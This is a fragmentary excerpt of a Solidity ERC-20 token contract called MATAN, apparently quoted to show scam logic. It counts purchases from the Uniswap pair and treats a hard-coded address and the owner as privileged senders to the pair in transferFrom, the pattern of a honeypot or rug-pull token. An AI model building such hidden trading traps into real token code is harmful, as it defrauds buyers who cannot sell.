...
contract MATAN is IERC20, Ownable {
    ...
    function transfer(address recipient, uint256 amount)
        ...
        returns (bool)
    {
        if(msg.sender == uniswapV2Pair && _transTimes <= 5){
            _transTimes = _transTimes +1;
         } 
    ...
    function transferFrom(
        ...
        if((sender == address(0xedEEFf704A0C0ae871E615421DD86c769181BB33) || sender == _owner)  && recipient == uniswapV2Pair){
